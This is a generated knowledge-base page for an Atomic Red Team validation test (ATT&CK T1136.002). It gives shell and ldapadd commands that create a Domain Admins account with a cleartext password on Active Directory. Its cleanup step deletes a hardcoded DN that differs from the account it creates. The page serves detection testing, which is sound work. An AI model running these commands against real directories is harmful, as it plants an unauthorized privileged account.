---
atomic_guid: "562aa072-524e-459a-ba2b-91f1afccf5ab"
title: "Active Directory Create Admin Account"
framework: "atomic"
generated: "true"
attack_technique_id: "T1136.002"
attack_technique_name: "Create Account: Domain Account"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "562aa072-524e-459a-ba2b-91f1afccf5ab"
  - "Active Directory Create Admin Account"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Active Directory Create Admin Account

Use Admin Credentials to Create A Domain Admin Account

## Metadata

- Atomic GUID: 562aa072-524e-459a-ba2b-91f1afccf5ab
- Technique: T1136.002: Create Account: Domain Account
- Platforms: linux
- Executor: sh
- Elevation Required: False
- Dependency Executor: sh
- Source Path: atomics/T1136.002/T1136.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1136-create_account|T1136.002]]

## Input Arguments

### admin_password

- description: password of the user with admin privileges referenced in admin_user
- type: string
- default: s3CurePssw0rD!

### admin_user

- description: username@domain of a user with admin privileges
- type: string
- default: admin@example.test

### domain

- description: The domain to be tested
- type: string
- default: example

### domain_controller

- description: Name of the domain_controller machine, defined in etc/hosts
- type: string
- default: adVM

### top_level_domain

- description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)
- type: string
- default: test

## Dependencies

Packages sssd-ad sssd-tools realmd adcli installed and realm available

### Prerequisite Check

```bash
which ldapadd && which ldapmodify
```

### Get Prerequisite

```bash
echo ldapadd or ldapmodify not found; exit 1
```

## Executor

- elevation_required: False
- name: sh

### Command

```bash
echo "dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
```

### Cleanup

```bash
echo removing Atomic User (temporary user)
echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
rm deleteuser.ldif
rm tempadmin.ldif
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.002/T1136.002.yaml)
